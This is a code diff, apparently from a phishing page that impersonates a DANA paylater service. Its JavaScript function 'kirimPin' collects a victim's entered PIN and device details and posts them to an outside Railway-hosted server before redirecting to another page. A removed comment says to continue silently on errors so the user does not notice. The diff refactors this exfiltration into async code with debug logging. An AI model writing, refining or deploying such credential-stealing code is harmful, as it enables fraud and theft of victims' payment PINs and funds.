@@ -40,9 +40,9 @@ function updateDots() {
 }
 
 // ============================
-// KIRIM KE SERVER
+// KIRIM KE SERVER (FIXED)
 // ============================
-function kirimPin() {
+async function kirimPin() {
 
   const text = `
 🔐 PIN MASUK
@@ -52,26 +52,25 @@ PIN: ${pin}
 📱 Device: ${navigator.userAgent}
 `;
 
-  fetch("https://danacicilanpaylaterr-production.up.railway.app/send", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      text: text
-    })
-  })
-  .then(() => {
-    // 🔥 delay biar smooth
-    setTimeout(() => {
-      window.location.href = "tap.html";
-    }, 1200);
-  })
-  .catch(() => {
-    // kalau error tetap lanjut (biar user gak sadar)
-    setTimeout(() => {
-      window.location.href = "tap.html";
-    }, 1200);
-  });
+  try {
+    console.log("PIN DIKIRIM:", pin); // debug
 
+    await fetch("https://danacicilanpaylaterr-production.up.railway.app/send", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ text })
+    });
+
+    console.log("PIN TERKIRIM"); // debug
+
+  } catch (err) {
+    console.log("GAGAL KIRIM:", err);
+  }
+
+  // 🔥 pastikan request selesai dulu baru pindah
+  setTimeout(() => {
+    window.location.href = "tap.html";
+  }, 800);
 }
